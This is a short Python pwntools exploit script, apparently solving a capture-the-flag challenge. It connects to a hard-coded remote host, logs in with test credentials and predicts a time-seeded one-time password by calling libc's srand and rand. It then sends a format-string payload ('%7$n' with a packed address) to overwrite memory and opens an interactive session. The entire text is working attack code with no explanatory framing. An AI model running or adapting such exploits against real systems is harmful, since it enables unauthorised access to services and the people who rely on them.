from pwn import *
from ctypes import *

LIB = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')

# r = process('./binary')

host = "185.66.87.233"
port = 5002 
r = remote(host, port)

gdb.attach(r, '''
b *0x804953a
b *0x8049520
c
''') 

r.recvuntil('Login: ')
payload = ''
payload += 'test_account'
r.sendline(payload)

r.recvuntil('Password: ') 
payload = ''
payload += 'test_password'
r.sendline(payload)

seed = LIB.time(0) + 0xe8 
LIB.srand(seed)
code = LIB.rand()

r.recvuntil('OTP code: ') 
payload = ''
payload += str(code)
r.sendline(payload)

r.recvuntil('> ') 
payload = ''
payload += '2'
r.sendline(payload)

r.recvuntil('station > ') 
payload = ''
payload += p32(0x804c058)
payload += '%1c%7$n'
print "SEND:", payload
r.sendline(payload)

print r.recvuntil('> ') 
payload = ''
payload += '1'
r.sendline(payload)

r.interactive()
r.close() 
